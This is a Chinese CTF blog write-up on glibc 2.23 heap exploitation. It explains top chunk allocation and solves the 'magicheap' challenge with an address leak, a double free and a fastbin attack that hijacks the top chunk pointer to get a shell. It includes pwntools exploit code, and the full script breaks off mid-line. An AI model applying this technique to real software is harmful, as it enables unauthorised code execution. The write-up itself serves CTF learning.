@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="最近参加了花东北赛区的线下赛，第一次参加线下赛有点紧张，所以，成绩不太好，但是学到一个top chunk的利用的思路，在此分享">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="top chunk">
+<meta property="og:url" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="最近参加了花东北赛区的线下赛，第一次参加线下赛有点紧张，所以，成绩不太好，但是学到一个top chunk的利用的思路，在此分享">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/top_bk.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/gdb.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/top_chunk.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/checksec.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/leak.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/name.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/stack.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/free.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/malloc.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/double-free.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/main.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/main_area.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/shell.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/patch.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/patch1.png">
+<meta property="og:updated_time" content="2020-05-24T14:57:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="top chunk">
+<meta name="twitter:description" content="最近参加了花东北赛区的线下赛，第一次参加线下赛有点紧张，所以，成绩不太好，但是学到一个top chunk的利用的思路，在此分享">
+<meta name="twitter:image" content="http://yoursite.com/2019/06/06/top-chunk/top-chunk/top_bk.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/06/06/top-chunk/top-chunk/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>top chunk | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-3nd???">
+
+    <a href="/3ND/" rel="section"><i class="fa fa-fw fa-user"></i>3ND???</a>
+
+  </li>
+        <li class="menu-item menu-item-flag???">
+
+    <a href="/flag/" rel="section"><i class="fa fa-fw fa-user"></i>flag???</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/06/top-chunk/top-chunk/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="PwnHt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          top chunk
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-06-06 19:53:30" itemprop="dateCreated datePublished" datetime="2019-06-06T19:53:30+08:00">2019-06-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-24 22:57:12" itemprop="dateModified" datetime="2020-05-24T22:57:12+08:00">2020-05-24</time>
+              </span>
+
+          
+            <div class="post-description">最近参加了花东北赛区的线下赛，第一次参加线下赛有点紧张，所以，成绩不太好，但是学到一个top chunk的利用的思路，在此分享</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x00-top-chunk"><a href="#0x00-top-chunk" class="headerlink" title="0x00 top chunk"></a>0x00 top chunk</h1><p>top chunk是一个特殊的chunk，当申请堆空间的时候，如果，bin链表中没有size合适的chunk，就会从top chunk分配空间,详细的结构体信息见</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#top-chunk" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#top-chun</a></p>
+<p>写一段代码来验证是不是这样</p>
+<ul>
+<li><p>test.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">        malloc(0x20);</span><br><span class="line">        malloc(0x100);        </span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编译命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o malloc test.c -g</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>gdb调试<br>首先断点在 <strong>main()</strong> 函数,因为要用到libc的源码，所以，首先需要下载，解压，然后在gdb使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory /home/xx/glibc-2.23/malloc/</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>/home/xx/glibc-2.23/malloc/</strong> 为你libc源码的路径，因为主要分析libc下malloc文件下的源码，所以直接指定malloc文件就可以了，要不然有的时候libc找不到</p>
+<p>这里主要分析第二个malloc</p>
+<ul>
+<li>先看一下第一个malloc分配之后，heap布局<br><img src="/2019/06/06/top-chunk/top-chunk/top_bk.png" alt=""><br>最后一个size 很大的chunk 就是我们的top chunk的了<br>大概调到这里的时候，就是top chunk的操作了<br><img src="/2019/06/06/top-chunk/top-chunk/gdb.png" alt=""></li>
+<li>在源码找到这段关键代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">3792       victim = av-&gt;top;</span><br><span class="line">3793       size = chunksize (victim);</span><br><span class="line">3794</span><br><span class="line">3795       if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">3796         &#123;</span><br><span class="line">3797           remainder_size = size - nb;</span><br><span class="line">3798           remainder = chunk_at_offset (victim, nb);</span><br><span class="line">3799           av-&gt;top = remainder;</span><br><span class="line">3800           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">3801                     (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">3802           set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">3803</span><br><span class="line">3804           check_malloced_chunk (av, victim, nb);</span><br><span class="line">3805           void *p = chunk2mem (victim);</span><br><span class="line">3806           alloc_perturb (p, bytes);</span><br><span class="line">3807           return p;</span><br><span class="line">3808         &#125;</span><br></pre></td></tr></table></figure>
+<p>这里的 <strong>victim</strong> 是一个 <strong>malloc_chunk</strong> 的指针，结构如下，具体见<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#malloc_chunk" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#malloc_chunk</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1108 struct malloc_chunk &#123;</span><br><span class="line">1109</span><br><span class="line">1110   INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">1111   INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line">1112</span><br><span class="line">1113   struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">1114   struct malloc_chunk* bk;</span><br><span class="line">1115</span><br><span class="line">1116   /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">1117   struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">1118   struct malloc_chunk* bk_nextsize;</span><br><span class="line">1119 &#125;;</span><br></pre></td></tr></table></figure></p>
+<p><strong>av</strong> 是指向这个进程的 <strong>main_arena</strong> 再来看一下 <strong>main_area</strong> 结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static struct malloc_state main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = 1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>main_arena是 <strong>malloc_state</strong> 的结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  /* Bitmap of bins */</span><br><span class="line">  unsigned int binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  /* Linked list */</span><br><span class="line">  struct malloc_state *next;</span><br><span class="line"></span><br><span class="line">  /* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">     by free_list_lock in arena.c.  */</span><br><span class="line">  struct malloc_state *next_free;</span><br><span class="line"></span><br><span class="line">  /* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="line">     the free list.  Access to this field is serialized by</span><br><span class="line">     free_list_lock in arena.c.  */</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  /* Memory allocated from the system in this arena.  */</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>从 <strong>malloc_state</strong> 结构体可以知道，<strong>av-&gt;top</strong> 就是 <strong>main_arena</strong> 的top chnk指针，在top chunk的分割出要分配的chunk的操作全靠这个指针来寻址</p>
+<p>让我们来看一下分配完chunk的布局<br><img src="/2019/06/06/top-chunk/top-chunk/top_chunk.png" alt=""></p>
+<ul>
+<li>思考：<br>既然top chunk这么特殊,怎么才能利用呢？<h1 id="0x01-利用方式"><a href="#0x01-利用方式" class="headerlink" title="0x01 利用方式"></a>0x01 利用方式</h1><h2 id="0x00-House-Of-Force"><a href="#0x00-House-Of-Force" class="headerlink" title="0x00 House Of Force"></a>0x00 House Of Force</h2>主要控制chunk的size段，来实现任意address malloc<h3 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h3></li>
+<li>可以控制top chunk的size段</li>
+<li>程序可以malloc 任意size的chunk<h3 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h3>见</li>
+</ul>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/</a></p>
+<h2 id="0x02-另一种利用方式"><a href="#0x02-另一种利用方式" class="headerlink" title="0x02 另一种利用方式"></a>0x02 另一种利用方式</h2><p>这里我就要介绍我在比赛中学到另一种用法,既然，既然在top chunk中分配chunk，要依靠top chunk的指针，我们是不是可以控制top chunk的指针，来实现任意address分配呢？答案是肯定的</p>
+<h3 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h3><ul>
+<li>有uaf或者double</li>
+<li>malloc 分配size在0x40以上，准确来说如果是大于0x70，也没有必要用这种利用方式，因为你有double free直接分配到malloc_hook的位置填入one_gadget就可以了</li>
+<li>要实现任意address malloc</li>
+</ul>
+<p>接下来，结合一道线下题目来使用一下这种利用方式</p>
+<h1 id="0x02-magicheap"><a href="#0x02-magicheap" class="headerlink" title="0x02 magicheap"></a>0x02 magicheap</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目比赛的时候一直没做出来，主要允许malloc的size实在太小了，最多允许malloc size是0x50的chunk，也就是分配0x60 chunk，还有leak address的地方，由于我用的是 <strong>sendlineafter()</strong> 函数，这样的话，<strong>printf()</strong> 和 <strong>puts()</strong> 函数就会被我发送的‘\n’ 截断掉，所以，我以为没有leak address的函数，我一直在尝试用 <strong>House of Roman</strong>，发现 <strong>size</strong> 小了一点没法利用，赛后请教大佬，才学到这种利用方式</p>
+<h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><ul>
+<li>本题给出了libc的版本是2.23<h2 id="break-it"><a href="#break-it" class="headerlink" title="break it"></a>break it</h2><h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><img src="/2019/06/06/top-chunk/top-chunk/checksec.png" alt=""></li>
+</ul>
+<p>保护全开</p>
+<h3 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h3><h4 id="0x00-leak-address"><a href="#0x00-leak-address" class="headerlink" title="0x00 leak address"></a>0x00 leak address</h4><p>在输入name和id的时候，你可以leak到一个栈的address和一个libc的address<br><img src="/2019/06/06/top-chunk/top-chunk/leak.png" alt=""><br>静态调试不容易看，动态调试看一下<br>gdb在这个函数下断点，在0xe33这个位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0xe33)</span><br></pre></td></tr></table></figure></p>
+<p>name先随便输入，比如说aaaa,id输入bbbb<br><img src="/2019/06/06/top-chunk/top-chunk/name.png" alt=""></p>
+<p>到达断点，看一下stack，发现id下面有一个libc的address,name的下面有一个栈的地址，所以，调整一下输入的长度，就可以把address leak出来</p>
+<p><img src="/2019/06/06/top-chunk/top-chunk/stack.png" alt=""></p>
+<p>对应的部分exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sa(&apos;name?&apos;,&apos;a&apos;*0x18)</span><br><span class="line">ru(&apos;\n&apos;)</span><br><span class="line">stack_addr=u64(ru(&apos;input&apos;)[0x18:0x18+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr=&apos;+hex(stack_addr)</span><br><span class="line">sa(&apos;ID&apos;,&apos;a&apos;*8)</span><br><span class="line">ru(&apos;a&apos;*8)</span><br><span class="line">libc_base=u64(ru(&apos;\n&apos;)[0:6].ljust(8,&apos;\x00&apos;))-libc.sym[&apos;_IO_file_setbuf&apos;]-9</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x01-free时指针未置0"><a href="#0x01-free时指针未置0" class="headerlink" title="0x01 free时指针未置0"></a>0x01 free时指针未置0</h3><p><img src="/2019/06/06/top-chunk/top-chunk/free.png" alt=""></p>
+<p>这就可以造成double free</p>
+<h3 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h3><p><img src="/2019/06/06/top-chunk/top-chunk/malloc.png" alt=""></p>
+<p>允许malloc的size太小</p>
+<h3 id="0x03-具体步骤"><a href="#0x03-具体步骤" class="headerlink" title="0x03 具体步骤"></a>0x03 具体步骤</h3><p>首先利用利用double free 使得fastbin chunk的fd指向main_arena附近<br><img src="/2019/06/06/top-chunk/top-chunk/double-free.png" alt=""></p>
+<p><img src="/2019/06/06/top-chunk/top-chunk/main.png" alt=""></p>
+<p>由上面的 <strong>malloc_state</strong> 结构体可知，top chunk指针上面是fastbin链表，又因为x64的heap一般分配到0x55或者0x56开头的地址,这给了chunk可以分配到main_arena附近的可能，因为chunk分配的时候，要过一个check</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2926   assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">2927           ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure>
+<p>这是检查以下几个条件</p>
+<ul>
+<li>chunk指针是否为空</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">342 #define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* size field is or&apos;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="line">1274 #define IS_MMAPPED 0x2</span><br><span class="line">1275</span><br><span class="line">1276 /* check for mmap()&apos;ed chunk */</span><br><span class="line">1277 #define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>chunk的是否由mmap分配，主要是检查size的低2位是否为2，当chunk是0x56的时候可以满足条件</li>
+<li>chunk的所在的area是不是和当前的area相等</li>
+</ul>
+<p>第一条和第三条不太可能成功，只能不断尝试<br>对应部分exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(0x40,&apos;aaaaaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaaaa&apos;)</span><br><span class="line">add(0x50,&apos;aaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaa&apos;)</span><br><span class="line">rm(2)</span><br><span class="line">rm(0)</span><br><span class="line">rm(1)</span><br><span class="line">rm(0)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,p64(malloc_hook-3-8+0x40))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">try:</span><br><span class="line">        add(0x40,&apos;a&apos;*(3+8*4)+p64(stack_addr-88-0x10))</span><br><span class="line">        raw_input(&apos;11&apos;)</span><br><span class="line">except:</span><br><span class="line">        io.close()</span><br><span class="line">        io=main()</span><br><span class="line">        exploit(io)</span><br><span class="line">print &apos;heap start 0x56 you win&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/06/06/top-chunk/top-chunk/main_area.png" alt=""></p>
+<p>如图我们已经分配成功了,接下来就是任意address分配了，你可以分配到malloc_hook的位置去写one_gadget,由于本题one_gadget全无效，所以，需要控制栈，把chunk分配到栈上覆盖返回值地址就可以了</p>
+<p><img src="/2019/06/06/top-chunk/top-chunk/shell.png" alt=""></p>
+<p>如图，就可以getshell了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">io=None</span><br><span class="line">__author__ = &apos;3summer&apos;</span><br><span class="line">s       = lambda data            :io.send(str(data))</span><br><span class="line">sa      = lambda delim,data      :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data            :io.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda numb=4096       :io.recv(numb)</span><br><span class="line">ru      = lambda delims,drop=True:io.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                  :io.interactive()</span><br><span class="line">uu32    = lambda data            :u32(data.ljust(4, &apos;\0&apos;))</span><br><span class="line">uu64    = lambda data            :u64(data.ljust(8, &apos;\0&apos;))</span><br><span class="line"></span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, 